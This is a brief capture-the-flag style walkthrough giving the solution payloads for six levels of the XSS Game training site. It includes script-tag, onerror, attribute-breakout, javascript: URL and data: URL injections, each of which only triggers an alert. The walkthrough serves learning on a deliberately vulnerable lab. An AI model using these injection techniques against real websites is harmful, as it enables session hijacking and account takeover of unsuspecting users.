# https://xss-game.appspot.com/

## Level 1
Insert `<script>alert();</script>` inside the input text box.

## Level 2
Insert `<img src="asdgf.png" onerror="javascript:alert();" />` inside the input text box.

## Level 3
Insert `'onerror="alert();"` into the URL bar after `../frame#` in place of `1` then click "Go".

## Level 4
Insert `1}}'); alert();('{{` inside the input text box.

## Level 5
Click "Sign up", then insert `javascript:alert();` in the URL bar after `next=` in place of `confirm`, then click "Go", then click "Next".

## Level 6
Insert `data:text/plain,alert();` into the URL bar after `../frame#` in place of `/static/gadget.js` then click "Go".
